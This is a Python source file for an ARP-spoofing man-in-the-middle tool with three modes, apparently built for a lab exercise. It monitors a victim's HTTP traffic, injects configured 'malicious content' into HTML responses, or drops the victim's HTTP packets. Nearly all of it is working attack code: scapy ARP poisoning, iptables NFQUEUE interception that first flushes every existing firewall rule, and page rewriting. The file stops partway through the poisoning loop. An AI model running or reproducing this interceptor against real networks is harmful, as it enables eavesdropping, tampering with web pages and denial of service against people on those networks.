#!/usr/bin/env python3
"""
New HTTP Interceptor with 3 Modes: MONITOR, TAMPER, DROP
Similar to TCP interceptor but for HTTP traffic with proper gzip handling
"""

from scapy.all import *
from netfilterqueue import NetfilterQueue
import os
import signal
import sys
import time
import re
import zlib
import io
import gzip
import logging
from datetime import datetime
import subprocess
import threading
from colorama import Fore, Back, Style, init

# Initialize colorama for colored output
init(autoreset=True)

# Import centralized configuration
from config import NetworkConfig, AttackConfig, SecurityConfig, PathConfig

# Use configuration values
victim_ip = AttackConfig.VICTIM_IP
gateway_ip = AttackConfig.GATEWAY_IP
interface = NetworkConfig.INTERFACE
victim_mac = AttackConfig.VICTIM_MAC
gateway_mac = AttackConfig.GATEWAY_MAC

# Get current HTTP attack mode and injection payload
HTTP_ATTACK_MODE = AttackConfig.HTTP_ATTACK_MODE
injection_code = AttackConfig.INJECTION_PAYLOADS.get(
    AttackConfig.CURRENT_PAYLOAD,
    AttackConfig.INJECTION_CODE
)

# Use the original simple injection code instead of complex HTML blocks
html_injection_block = injection_code

# Setup detailed logging with different levels for different modes
log_level = logging.DEBUG if HTTP_ATTACK_MODE == "MONITOR" else logging.INFO
logging.basicConfig(
    level=log_level,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(f'http_{HTTP_ATTACK_MODE.lower()}_attack.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class HTTPInterceptorStats:
    """Comprehensive statistics tracking for HTTP interception"""
    def __init__(self):
        self.start_time = time.time()
        
        # Packet counters
        self.total_packets = 0
        self.http_requests = 0
        self.http_responses = 0
        self.https_packets = 0
        self.non_http_packets = 0
        
        # Mode-specific counters
        self.monitored_packets = 0
        self.tampered_packets = 0
        self.dropped_packets = 0
        
        # Content analysis
        self.html_responses = 0
        self.gzip_responses = 0
        self.chunked_responses = 0
        self.large_responses = 0  # > 10KB
        
        # Domains and URLs
        self.domains_seen = set()
        self.urls_intercepted = []
        
        # Errors
        self.processing_errors = 0
        self.gzip_errors = 0
        self.injection_failures = 0
    
    def log_request(self, method, url, host, user_agent=None):
        """Log HTTP request details"""
        self.http_requests += 1
        if host:
            self.domains_seen.add(host)
        self.urls_intercepted.append(f"{method} {url}")
        
        # Keep only last 50 URLs to avoid memory issues
        if len(self.urls_intercepted) > 50:
            self.urls_intercepted = self.urls_intercepted[-50:]
    
    def log_response(self, status_code, content_type, content_length, is_gzip=False, is_chunked=False):
        """Log HTTP response details"""
        self.http_responses += 1
        
        if 'text/html' in content_type.lower():
            self.html_responses += 1
        
        if is_gzip:
            self.gzip_responses += 1
        
        if is_chunked:
            self.chunked_responses += 1
        
        try:
            if content_length and int(content_length) > 10240:  # 10KB
                self.large_responses += 1
        except:
            pass
    
    def print_stats(self):
        """Print comprehensive statistics"""
        runtime = time.time() - self.start_time
        
        print(f"\n{Fore.CYAN}{'='*70}")
        print(f"📊 HTTP INTERCEPTOR STATISTICS - {HTTP_ATTACK_MODE} MODE")
        print(f"{'='*70}{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}⏱️  RUNTIME: {runtime:.1f} seconds{Style.RESET_ALL}")
        
        print(f"\n{Fore.GREEN}📦 PACKET STATISTICS:{Style.RESET_ALL}")
        print(f"   Total packets processed: {self.total_packets}")
        print(f"   HTTP requests: {self.http_requests}")
        print(f"   HTTP responses: {self.http_responses}")
        print(f"   HTTPS packets (encrypted): {self.https_packets}")
        print(f"   Non-HTTP packets: {self.non_http_packets}")
        
        print(f"\n{Fore.BLUE}🎯 MODE-SPECIFIC ACTIONS:{Style.RESET_ALL}")
        if HTTP_ATTACK_MODE == "MONITOR":
            print(f"   Packets monitored: {self.monitored_packets}")
        elif HTTP_ATTACK_MODE == "TAMPER":
            print(f"   Packets tampered: {self.tampered_packets}")
            print(f"   Injection failures: {self.injection_failures}")
        elif HTTP_ATTACK_MODE == "DROP":
            print(f"   Packets dropped: {self.dropped_packets}")
        
        print(f"\n{Fore.MAGENTA}📄 CONTENT ANALYSIS:{Style.RESET_ALL}")
        print(f"   HTML responses: {self.html_responses}")
        print(f"   Gzip compressed: {self.gzip_responses}")
        print(f"   Chunked encoding: {self.chunked_responses}")
        print(f"   Large responses (>10KB): {self.large_responses}")
        
        if self.domains_seen:
            print(f"\n{Fore.CYAN}🌐 DOMAINS INTERCEPTED ({len(self.domains_seen)}):{Style.RESET_ALL}")
            for domain in sorted(self.domains_seen):
                print(f"   • {domain}")
        
        if self.urls_intercepted:
            print(f"\n{Fore.YELLOW}🔗 RECENT URLs (last 10):{Style.RESET_ALL}")
            for url in self.urls_intercepted[-10:]:
                print(f"   • {url}")
        
        if self.processing_errors > 0:
            print(f"\n{Fore.RED}❌ ERRORS:{Style.RESET_ALL}")
            print(f"   Processing errors: {self.processing_errors}")
            print(f"   Gzip errors: {self.gzip_errors}")
        
        # Mode-specific recommendations
        self.print_recommendations()
    
    def print_recommendations(self):
        """Print mode-specific recommendations"""
        print(f"\n{Fore.GREEN}💡 RECOMMENDATIONS:{Style.RESET_ALL}")
        
        if HTTP_ATTACK_MODE == "MONITOR":
            if self.http_requests == 0:
                print(f"   {Fore.YELLOW}• No HTTP requests detected - victim may not be browsing{Style.RESET_ALL}")
                print(f"   {Fore.YELLOW}• Try browsing to http://neverssl.com from victim device{Style.RESET_ALL}")
            else:
                print(f"   {Fore.GREEN}• HTTP monitoring is working correctly{Style.RESET_ALL}")
                print(f"   {Fore.GREEN}• Switch to TAMPER mode to modify traffic{Style.RESET_ALL}")
        
        elif HTTP_ATTACK_MODE == "TAMPER":
            if self.tampered_packets == 0:
                print(f"   {Fore.YELLOW}• No successful tampering - most traffic may be HTTPS{Style.RESET_ALL}")
                print(f"   {Fore.YELLOW}• Try visiting HTTP-only sites for testing{Style.RESET_ALL}")
            else:
                print(f"   {Fore.GREEN}• HTTP tampering is working correctly{Style.RESET_ALL}")
            
            if self.gzip_errors > 0:
                print(f"   {Fore.RED}• Gzip handling errors detected - may need improvements{Style.RESET_ALL}")
        
        elif HTTP_ATTACK_MODE == "DROP":
            if self.dropped_packets > 0:
                print(f"   {Fore.GREEN}• HTTP dropping is working - victim should have browsing issues{Style.RESET_ALL}")
                print(f"   {Fore.YELLOW}• HTTPS traffic will still work (encrypted){Style.RESET_ALL}")
            else:
                print(f"   {Fore.YELLOW}• No HTTP packets dropped - victim may not be browsing HTTP sites{Style.RESET_ALL}")

stats = HTTPInterceptorStats()

def enable_ip_forwarding():
    """Enable IP forwarding for MITM"""
    logger.info("[SETUP] Enabling IP forwarding")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
            if f.read().strip() == '1':
                logger.info("[SETUP] ✅ IP forwarding enabled successfully")
                return True
            else:
                logger.warning("[SETUP] ⚠️ IP forwarding may not be enabled")
                return False
    except:
        logger.warning("[SETUP] Could not verify IP forwarding status")
        return False

def disable_ip_forwarding():
    """Disable IP forwarding"""
    logger.info("[CLEANUP] Disabling IP forwarding")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def poison(victim_ip, victim_mac, spoof_ip):
    """Send ARP poison packet"""
    pkt = Ether(dst=victim_mac) / ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
    sendp(pkt, iface=interface, verbose=0)

def restore(target_ip, target_mac, source_ip, source_mac):
    """Restore ARP table"""
    logger.info(f"[ARP-RESTORE] Restoring {target_ip} -> {source_ip} mapping")
    pkt = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac,
                                      psrc=source_ip, hwsrc=source_mac)
    sendp(pkt, count=5, iface=interface, verbose=0)

def extract_http_info(payload):
    """Extract HTTP request/response information for monitoring"""
    try:
        text = payload.decode('utf-8', errors='ignore')
        lines = text.split('\n')
        
        if not lines:
            return None
        
        first_line = lines[0].strip()
        headers = {}
        
        # Parse headers
        for line in lines[1:]:
            if ':' in line:
                key, value = line.split(':', 1)
                headers[key.strip().lower()] = value.strip()
            elif line.strip() == '':
                break  # End of headers
        
        return {
            'first_line': first_line,
            'headers': headers,
            'host': headers.get('host', ''),
            'user_agent': headers.get('user-agent', ''),
            'content_type': headers.get('content-type', ''),
            'content_length': headers.get('content-length', ''),
            'content_encoding': headers.get('content-encoding', ''),
            'transfer_encoding': headers.get('transfer-encoding', '')
        }
    except Exception as e:
        logger.debug(f"[HTTP-PARSE] Error parsing HTTP info: {e}")
        return None

def monitor_http_packet(scapy_pkt, tcp_layer, payload):
    """Monitor HTTP packet without modification (MONITOR mode)"""
    stats.monitored_packets += 1
    
    src_ip = scapy_pkt.src
    dst_ip = scapy_pkt.dst
    src_port = tcp_layer.sport
    dst_port = tcp_layer.dport
    
    # Determine packet direction
    if src_ip == victim_ip:
        direction = f"{Fore.BLUE}OUTGOING{Style.RESET_ALL}"
        endpoint = f"{src_ip}:{src_port} → {dst_ip}:{dst_port}"
    else:
        direction = f"{Fore.GREEN}INCOMING{Style.RESET_ALL}"
        endpoint = f"{src_ip}:{src_port} → {dst_ip}:{dst_port}"
    
    # Check if it's an HTTP request
    if payload.startswith(b"GET ") or payload.startswith(b"POST ") or \
       payload.startswith(b"PUT ") or payload.startswith(b"DELETE ") or \
       payload.startswith(b"HEAD ") or payload.startswith(b"OPTIONS "):
        
        http_info = extract_http_info(payload)
        if http_info:
            method = http_info['first_line'].split()[0]
            url = http_info['first_line'].split()[1] if len(http_info['first_line'].split()) > 1 else "/"
            host = http_info['host']
            user_agent = http_info['user_agent']
            
            stats.log_request(method, url, host, user_agent)
            
            print(f"\n{Fore.CYAN}🌐 HTTP REQUEST [{direction}]{Style.RESET_ALL}")
            print(f"   {Fore.WHITE}Endpoint: {endpoint}{Style.RESET_ALL}")
            print(f"   {Fore.YELLOW}Request: {http_info['first_line']}{Style.RESET_ALL}")
            if host:
                print(f"   {Fore.GREEN}Host: {host}{Style.RESET_ALL}")
            if user_agent:
                print(f"   {Fore.MAGENTA}User-Agent: {user_agent[:50]}{'...' if len(user_agent) > 50 else ''}{Style.RESET_ALL}")
            
            logger.info(f"[HTTP-REQUEST] {direction.replace(Fore.BLUE, '').replace(Fore.GREEN, '').replace(Style.RESET_ALL, '')} {method} {url} - Host: {host}")
    
    # Check if it's an HTTP response
    elif payload.startswith(b"HTTP/"):
        http_info = extract_http_info(payload)
        if http_info:
            status_line = http_info['first_line']
            content_type = http_info['content_type']
            content_length = http_info['content_length']
            content_encoding = http_info['content_encoding']
            transfer_encoding = http_info['transfer_encoding']
            
            # Extract status code
            status_code = status_line.split()[1] if len(status_line.split()) > 1 else "Unknown"
            
            stats.log_response(status_code, content_type, content_length, 
                             content_encoding == 'gzip', transfer_encoding == 'chunked')
            
            # Color code status
            if status_code.startswith('2'):
                status_color = Fore.GREEN
            elif status_code.startswith('3'):
                status_color = Fore.YELLOW
            elif status_code.startswith('4') or status_code.startswith('5'):
                status_color = Fore.RED
            else:
                status_color = Fore.WHITE
            
            print(f"\n{Fore.CYAN}📄 HTTP RESPONSE [{direction}]{Style.RESET_ALL}")
            print(f"   {Fore.WHITE}Endpoint: {endpoint}{Style.RESET_ALL}")
            print(f"   {status_color}Status: {status_line}{Style.RESET_ALL}")
            if content_type:
                print(f"   {Fore.BLUE}Content-Type: {content_type}{Style.RESET_ALL}")
            if content_length:
                print(f"   {Fore.MAGENTA}Content-Length: {content_length} bytes{Style.RESET_ALL}")
            if content_encoding:
                print(f"   {Fore.CYAN}Content-Encoding: {content_encoding}{Style.RESET_ALL}")
            if transfer_encoding:
                print(f"   {Fore.YELLOW}Transfer-Encoding: {transfer_encoding}{Style.RESET_ALL}")
            
            # Show payload preview for small responses
            if content_length and content_length.isdigit() and int(content_length) < 500:
                try:
                    headers_end = payload.find(b'\r\n\r\n')
                    if headers_end != -1:
                        body = payload[headers_end + 4:headers_end + 104]  # First 100 bytes
                        body_text = body.decode('utf-8', errors='ignore')
                        if body_text.strip():
                            print(f"   {Fore.WHITE}Body Preview: {body_text[:50]}{'...' if len(body_text) > 50 else ''}{Style.RESET_ALL}")
                except:
                    pass
            
            logger.info(f"[HTTP-RESPONSE] {direction.replace(Fore.BLUE, '').replace(Fore.GREEN, '').replace(Style.RESET_ALL, '')} {status_line} - Type: {content_type}")

def decode_chunked(data):
    """Decode HTTP chunked transfer encoding"""
    decoded = b""
    pos = 0
    chunk_count = 0
    
    try:
        while pos < len(data):
            # Find the end of the chunk size line
            end_pos = data.find(b"\r\n", pos)
            if end_pos == -1:
                break
                
            # Extract chunk size (in hex)
            chunk_size_str = data[pos:end_pos].decode('ascii', errors='ignore')
            try:
                chunk_size = int(chunk_size_str, 16)
            except ValueError:
                logger.warning(f"[CHUNKED] Invalid chunk size: {chunk_size_str}")
                break
            
            chunk_count += 1
            
            # If chunk size is 0, we're done
            if chunk_size == 0:
                break
                
            # Move past the chunk size line
            pos = end_pos + 2
            
            # Extract the chunk data
            if pos + chunk_size > len(data):
                logger.warning(f"[CHUNKED] Chunk {chunk_count} extends beyond data")
                break
                
            decoded += data[pos:pos + chunk_size]
            pos += chunk_size + 2  # Skip the trailing \r\n
            
        logger.debug(f"[CHUNKED] Decoded {chunk_count} chunks, total size: {len(decoded)} bytes")
        return decoded
        
    except Exception as e:
        logger.warning(f"[CHUNKED] Error decoding chunked data: {e}")
        return data  # Return original data if decoding fails

def encode_chunked(data):
    """Encode data using HTTP chunked transfer encoding"""
    chunks = []
    chunk_size = 1024
    chunk_count = 0
    
    for i in range(0, len(data), chunk_size):
        chunk = data[i:i+chunk_size]
        chunks.append(b"%X\r\n" % len(chunk) + chunk + b"\r\n")
        chunk_count += 1
        
    chunks.append(b"0\r\n\r\n")  # End chunk
    logger.debug(f"[CHUNKED] Encoded {chunk_count} chunks")
    return b"".join(chunks)

def inject_at_top(html_bytes, injection_code):
    """Insert injection code at the top of HTML content"""
    # Simple approach: try to inject after <body> tag, otherwise prepend
    pattern = re.compile(b"(<body[^>]*>)", re.IGNORECASE)
    match = pattern.search(html_bytes)
    if match:
        insert_pos = match.end()
        logger.debug(f"[INJECTION] Found <body> tag, injecting after it")
        return html_bytes[:insert_pos] + injection_code + html_bytes[insert_pos:]
    else:
        # No <body> tag found, just prepend to content
        logger.debug(f"[INJECTION] No <body> tag found, prepending injection")
        return injection_code + html_bytes

def tamper_http_packet(scapy_pkt, tcp_layer, payload):
    """Tamper with HTTP packet by injecting content (TAMPER mode) - Simple version with extensive logging"""
    
    logger.info(f"[TAMPER-DEBUG] Starting tamper attempt on packet from {scapy_pkt.src}:{tcp_layer.sport} -> {scapy_pkt.dst}:{tcp_layer.dport}")
    logger.info(f"[TAMPER-DEBUG] Payload size: {len(payload)} bytes")
    logger.info(f"[TAMPER-DEBUG] Payload starts with: {payload[:50]}")
    
    # Check if this is an HTTP response
    if not payload.startswith(b"HTTP/"):
        logger.debug(f"[TAMPER-DEBUG] Not an HTTP response (doesn't start with HTTP/)")
        return None
    
    logger.info(f"[TAMPER-DEBUG] ✅ Confirmed HTTP response")
    
    try:
        # Try to split headers and body
        if b"\r\n\r\n" not in payload:
            logger.warning(f"[TAMPER-DEBUG] No header/body separator found in payload")
            return None
        
        header_raw, body = payload.split(b"\r\n\r\n", 1)
        logger.info(f"[TAMPER-DEBUG] Split successful - Headers: {len(header_raw)} bytes, Body: {len(body)} bytes")
        
        # Decode headers
        headers_text = header_raw.decode('utf-8', errors='ignore')
        logger.info(f"[TAMPER-DEBUG] Headers decoded successfully")
        
        # Log the first few header lines for debugging
        header_lines = headers_text.split('\r\n')
        logger.info(f"[TAMPER-DEBUG] Status line: {header_lines[0] if header_lines else 'None'}")
        
        # Parse headers into dictionary
        header_dict = {}
        for line in header_lines[1:]:  # Skip status line
            if ':' in line:
                key, value = line.split(':', 1)
                header_dict[key.strip().lower()] = value.strip().lower()
        
        logger.info(f"[TAMPER-DEBUG] Parsed {len(header_dict)} headers")
        
        # Get important headers
        content_type = header_dict.get("content-type", "")
        content_length = header_dict.get("content-length", "")
        content_encoding = header_dict.get("content-encoding", "")
        
        logger.info(f"[TAMPER-DEBUG] Content-Type: '{content_type}'")
        logger.info(f"[TAMPER-DEBUG] Content-Length: '{content_length}'")
        logger.info(f"[TAMPER-DEBUG] Content-Encoding: '{content_encoding}'")
        
        # Check if it's HTML content
        if 'text/html' not in content_type:
            logger.info(f"[TAMPER-DEBUG] ❌ Not HTML content, skipping injection")
            return None
        
        logger.info(f"[TAMPER-DEBUG] ✅ HTML content detected!")
        
        # Check for gzip encoding
        if 'gzip' in content_encoding:
            logger.info(f"[TAMPER-DEBUG] ❌ Gzip encoding detected, skipping to avoid fragmentation")
            return None
        
        logger.info(f"[TAMPER-DEBUG] ✅ No gzip encoding, proceeding with injection")
        
        # Log body preview
        body_preview = body[:200].decode('utf-8', errors='ignore')
        logger.info(f"[TAMPER-DEBUG] Body preview (first 200 chars): {body_preview}")
        
        # Perform injection
        logger.info(f"[TAMPER-DEBUG] Attempting injection with {len(html_injection_block)} bytes of payload")
        injected_body = inject_at_top(body, html_injection_block)
        
        # Check injection result
        size_increase = len(injected_body) - len(body)
        logger.info(f"[TAMPER-DEBUG] Injection result: Original {len(body)} bytes -> {len(injected_body)} bytes (increase: {size_increase})")
        
        if size_increase <= 0:
            logger.warning(f"[TAMPER-DEBUG] ❌ Injection failed - no size increase")
            stats.injection_failures += 1
            return None
        
        logger.info(f"[TAMPER-DEBUG] ✅ Injection successful!")
        
        # Update Content-Length header
        if content_length:
            new_length = str(len(injected_body))
            logger.info(f"[TAMPER-DEBUG] Updating Content-Length: {content_length} -> {new_length}")
            
            # Replace Content-Length in headers
            headers_text = re.sub(
                r"(?i)^(Content-Length:\s*)\d+",
                f"Content-Length: {new_length}",
                headers_text,
                flags=re.MULTILINE
            )
            logger.info(f"[TAMPER-DEBUG] Content-Length header updated")
        else:
            logger.info(f"[TAMPER-DEBUG] No Content-Length header to update")
        
        # Rebuild the complete HTTP response
        new_payload = headers_text.encode() + b"\r\n\r\n" + injected_body
        logger.info(f"[TAMPER-DEBUG] Rebuilt payload: {len(new_payload)} bytes total")
        
        # Update statistics
        stats.tampered_packets += 1
        
        logger.info(f"[TAMPER-DEBUG] ✅ Successfully created tampered packet!")
        return new_payload
        
    except Exception as e:
        logger.error(f"[TAMPER-DEBUG] ❌ Exception during tampering: {e}")
        logger.error(f"[TAMPER-DEBUG] Exception type: {type(e).__name__}")
        import traceback
        logger.error(f"[TAMPER-DEBUG] Traceback: {traceback.format_exc()}")
        stats.processing_errors += 1
        return None

def modify_packet(packet):
    """Main packet modification function based on HTTP_ATTACK_MODE"""
    try:
        scapy_pkt = IP(packet.get_payload())
        stats.total_packets += 1
        
        src_ip = scapy_pkt.src
        dst_ip = scapy_pkt.dst
        
        # Check if this traffic involves our target victim
        is_victim_traffic = (src_ip == victim_ip or dst_ip == victim_ip)
        
        if not is_victim_traffic:
            packet.accept()
            return
        
        # Check for HTTPS traffic (port 443) - log but don't process
        if scapy_pkt.haslayer(TCP):
            tcp_layer = scapy_pkt[TCP]
            if tcp_layer.dport == 443 or tcp_layer.sport == 443:
                stats.https_packets += 1
                if stats.https_packets % 20 == 0:  # Log every 20th HTTPS packet
                    logger.debug(f"[HTTPS] 🔒 HTTPS traffic: {src_ip}:{tcp_layer.sport} ↔ {dst_ip}:{tcp_layer.dport}")
                packet.accept()
                return
        
        # Only process TCP packets with payload
        if not scapy_pkt.haslayer(TCP) or not scapy_pkt.haslayer(Raw):
            stats.non_http_packets += 1
            packet.accept()
            return
        
        tcp_layer = scapy_pkt[TCP]
        payload = scapy_pkt[Raw].load
        
        logger.debug(f"[TCP-DEBUG] TCP packet: {src_ip}:{tcp_layer.sport} -> {dst_ip}:{tcp_layer.dport}, payload: {len(payload)} bytes")
        
        # Use port-based detection like the original working version (port 80 and 8000)
        # Only process HTTP responses from port 80 or 8000
        if not ((tcp_layer.sport == 80 or tcp_layer.sport == 8000) and payload.startswith(b'HTTP/')):
            stats.non_http_packets += 1
            
            # Log more details about why packets are being skipped
            if tcp_layer.sport == 80 or tcp_layer.dport == 80 or tcp_layer.sport == 8000 or tcp_layer.dport == 8000:
                payload_preview = payload[:50].decode('utf-8', errors='ignore')
                logger.debug(f"[PORT-DEBUG] Port 80/8000 traffic but not HTTP response: {src_ip}:{tcp_layer.sport} -> {dst_ip}:{tcp_layer.dport}")
                logger.debug(f"[PORT-DEBUG] Payload preview: {payload_preview}")
                
                if not payload.startswith(b'HTTP/'):
                    logger.debug(f"[PORT-DEBUG] Payload doesn't start with HTTP/ - might be request or fragment")
            
            packet.accept()
            return
        
        logger.info(f"[HTTP-RESPONSE-FOUND] 🎯 HTTP response detected from {src_ip}:{tcp_layer.sport} -> {dst_ip}:{tcp_layer.dport}")
        logger.info(f"[HTTP-RESPONSE-FOUND] Payload size: {len(payload)} bytes")
        
        # Log HTTP requests for monitoring
        is_http_request = payload.startswith(b"GET ") or payload.startswith(b"POST ") or \
                         payload.startswith(b"PUT ") or payload.startswith(b"DELETE ") or \
                         payload.startswith(b"HEAD ") or payload.startswith(b"OPTIONS ")
        
        if is_http_request:
            monitor_http_packet(scapy_pkt, tcp_layer, payload)
            packet.accept()
            return
        
        # Now we have HTTP response traffic - handle based on mode
        
        logger.info(f"[MODE-HANDLER] Processing HTTP response in {HTTP_ATTACK_MODE} mode")
        
        if HTTP_ATTACK_MODE == "MONITOR":
            # Monitor mode: log the packet and pass it through
            monitor_http_packet(scapy_pkt, tcp_layer, payload)
            packet.accept()
            
        elif HTTP_ATTACK_MODE == "TAMPER":
            # Tamper mode: try to inject content into HTML responses
            logger.info(f"[TAMPER-MODE] Calling tamper_http_packet function")
            new_payload = tamper_http_packet(scapy_pkt, tcp_layer, payload)
            if new_payload:
                # Successful tampering
                logger.info(f"[TAMPER-MODE] Tampering successful, updating packet")
                scapy_pkt[Raw].load = new_payload
                
                # Clear checksums for recalculation
                del scapy_pkt[IP].len
                del scapy_pkt[IP].chksum
                del scapy_pkt[TCP].chksum
                
                packet.set_payload(bytes(scapy_pkt))
                logger.info(f"[TAMPER] ✅ Packet modified and forwarded")
            else:
                # Failed tampering or not suitable for tampering
                logger.info("[TAMPER-MODE] Tampering failed or not suitable, forwarding original")
            
            packet.accept()
            
        elif HTTP_ATTACK_MODE == "DROP":
            # Drop mode: drop all HTTP packets
            stats.dropped_packets += 1
            if stats.dropped_packets % 10 == 0:  # Log every 10th drop
                logger.info(f"[DROP] 🗑️ Dropped HTTP response - Total dropped: {stats.dropped_packets}")
            
            # Don't call packet.accept() - this drops the packet
            packet.drop()
            
        else:
            logger.error(f"[ERROR] Unknown HTTP attack mode: {HTTP_ATTACK_MODE}")
            packet.accept()
    
    except Exception as e:
        logger.error(f"[ERROR] Error processing packet: {e}")
        stats.processing_errors += 1
        packet.accept()

def start_packet_interception():
    """Start packet interception based on mode"""
    logger.info(f"[SETUP] Setting up iptables rules for HTTP {HTTP_ATTACK_MODE} mode")
    
    # Clear existing rules first
    os.system("iptables -F")
    os.system("iptables -X")
    
    # Add our rule
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
    
    # Verify iptables rule was added
    try:
        result = subprocess.run(['iptables', '-L', 'FORWARD', '-n'], 
                              capture_output=True, text=True)
        if 'NFQUEUE' in result.stdout:
            logger.info("[SETUP] ✅ iptables NFQUEUE rule successfully added")
        else:
            logger.warning("[SETUP] ⚠️ iptables rule may not have been added correctly")
    except:
        logger.warning("[SETUP] Could not verify iptables rule")
    
    nfqueue = NetfilterQueue()
    nfqueue.bind(0, modify_packet)
    
    print(f"\n{Fore.GREEN}🚀 HTTP INTERCEPTOR STARTED - {HTTP_ATTACK_MODE} MODE{Style.RESET_ALL}")
    print(f"{Fore.CYAN}📡 Target: {victim_ip} ↔ Gateway: {gateway_ip}{Style.RESET_ALL}")
    
    if HTTP_ATTACK_MODE == "MONITOR":
        print(f"{Fore.YELLOW}👁️  MONITOR MODE: Logging all HTTP traffic without modification{Style.RESET_ALL}")
        print(f"{Fore.BLUE}💡 Watch the output for detailed HTTP request/response information{Style.RESET_ALL}")
    elif HTTP_ATTACK_MODE == "TAMPER":
        print(f"{Fore.RED}🔧 TAMPER MODE: Injecting content into HTML responses{Style.RESET_ALL}")
        print(f"{Fore.BLUE}💉 Injection Type: {AttackConfig.CURRENT_HTML_INJECTION}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}📏 Injection Size: {len(html_injection_block)} bytes{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}💡 Browse to HTTP sites like http://neverssl.com to see injection{Style.RESET_ALL}")
        print(f"{Fore.GREEN}✨ Original page content will be preserved with injected banner{Style.RESET_ALL}")
    elif HTTP_ATTACK_MODE == "DROP":
        print(f"{Fore.MAGENTA}🗑️  DROP MODE: Blocking all HTTP traffic{Style.RESET_ALL}")
        print(f"{Fore.RED}⚠️  Victim will be unable to browse HTTP sites{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}💡 HTTPS sites will still work (encrypted){Style.RESET_ALL}")
    
    print(f"{Fore.WHITE}🛑 Press Ctrl+C to stop and view statistics{Style.RESET_ALL}")
    
    try:
        nfqueue.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[INTERCEPTOR] 🛑 Stopping HTTP interceptor...{Style.RESET_ALL}")
    finally:
        nfqueue.unbind()
        logger.info("[CLEANUP] Removing iptables rules...")
        os.system("iptables -F")
        stats.print_stats()

def print_mode_explanation():
    """Print explanation of the 3 modes"""
    print(f"\n{Fore.CYAN}{'='*70}")
    print(f"🎯 HTTP INTERCEPTOR - 3 MODES EXPLAINED")
    print(f"{'='*70}{Style.RESET_ALL}")
    
    print(f"\n{Fore.YELLOW}📋 CURRENT MODE: {HTTP_ATTACK_MODE}{Style.RESET_ALL}")
    
    print(f"\n{Fore.GREEN}1. MONITOR MODE:{Style.RESET_ALL}")
    print(f"   • Logs all HTTP traffic without modification")
    print(f"   • Shows detailed request/response information")
    print(f"   • Perfect for understanding network behavior")
    print(f"   • No impact on victim browsing experience")
    
    print(f"\n{Fore.RED}2. TAMPER MODE:{Style.RESET_ALL}")
    print(f"   • Injects malicious content into HTML responses")
    print(f"   • Handles gzip compression/decompression")
    print(f"   • Modifies web pages in real-time")
    print(f"   • Demonstrates content injection attacks")
    
    print(f"\n{Fore.MAGENTA}3. DROP MODE:{Style.RESET_ALL}")
    print(f"   • Drops all HTTP packets completely")
    print(f"   • Prevents victim from browsing HTTP sites")
    print(f"   • Demonstrates denial-of-service attacks")
    print(f"   • HTTPS traffic remains unaffected")
    
    print(f"\n{Fore.BLUE}🔧 TO CHANGE MODE:{Style.RESET_ALL}")
    print(f"   Edit config.py and change:")
    print(f"   AttackConfig.HTTP_ATTACK_MODE = 'MONITOR'  # or 'TAMPER' or 'DROP'")
    
    print(f"\n{Fore.YELLOW}🧪 TESTING RECOMMENDATIONS:{Style.RESET_ALL}")
    print(f"   • Start with MONITOR mode to understand traffic")
    print(f"   • Use TAMPER mode to test content injection")
    print(f"   • Use DROP mode to test DoS protection")
    print(f"   • Test with: http://neverssl.com (HTTP-only site)")
    
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")

def main():
    """Main function"""
    print_mode_explanation()
    
    # Validate mode
    if HTTP_ATTACK_MODE not in AttackConfig.ALLOWED_HTTP_ATTACK_MODES:
        print(f"{Fore.RED}❌ Invalid HTTP attack mode: {HTTP_ATTACK_MODE}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}💡 Valid modes: {AttackConfig.ALLOWED_HTTP_ATTACK_MODES}{Style.RESET_ALL}")
        sys.exit(1)
    
    # Ask for confirmation
    if SecurityConfig.REQUIRE_CONFIRMATION:
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        confirmation = input(f"🔍 Proceed with HTTP {HTTP_ATTACK_MODE} mode? [y/N]: ").lower().strip()
        if confirmation not in ['y', 'yes']:
            print(f"{Fore.YELLOW}❌ Attack cancelled by user.{Style.RESET_ALL}")
            sys.exit(0)
        
        if HTTP_ATTACK_MODE == "DROP":
            print(f"{Fore.RED}⚠️  WARNING: DROP mode will prevent HTTP browsing!{Style.RESET_ALL}")
            confirmation = input("🔍 Are you sure you want to block HTTP traffic? [y/N]: ").lower().strip()
            if confirmation not in ['y', 'yes']:
                print(f"{Fore.YELLOW}❌ DROP mode cancelled.{Style.RESET_ALL}")
                sys.exit(0)
    
    logger.info(f"[ATTACK] 🚀 Starting HTTP {HTTP_ATTACK_MODE} attack")
    logger.info(f"[ATTACK] Target: {victim_ip} ↔ Gateway: {gateway_ip}")
    logger.info(f"[ATTACK] Attacker MAC: {get_if_hwaddr(interface)}")
    
    # Enable IP forwarding (except for DROP mode where we want to break connectivity)
    if HTTP_ATTACK_MODE != "DROP":
        if not enable_ip_forwarding():
            logger.error("❌ Failed to enable IP forwarding")
            sys.exit(1)
    else:
        logger.info("[DROP-MODE] Skipping IP forwarding to enhance blocking effect")

    def exit_gracefully(signum, frame):
        logger.info(f"\n[CLEANUP] 🧹 Starting cleanup process...")
        logger.info("[CLEANUP] Restoring ARP tables...")
        
        # Restore ARP tables
        restore(victim_ip, victim_mac, gateway_ip, gateway_mac)
        restore(gateway_ip, gateway_mac, victim_ip, victim_mac)
        
        if HTTP_ATTACK_MODE != "DROP":
            disable_ip_forwarding()
        
        logger.info("[CLEANUP] Removing iptables rules...")
        os.system("iptables -F")
        logger.info("[CLEANUP] ✅ Cleanup complete")
        
        # Print final statistics
        stats.print_stats()
        sys.exit(0)

    signal.signal(signal.SIGINT, exit_gracefully)

    # Start ARP poisoning in background
    def poison_loop():
        logger.info("[ARP-POISON] 🎯 Starting continuous ARP poisoning")
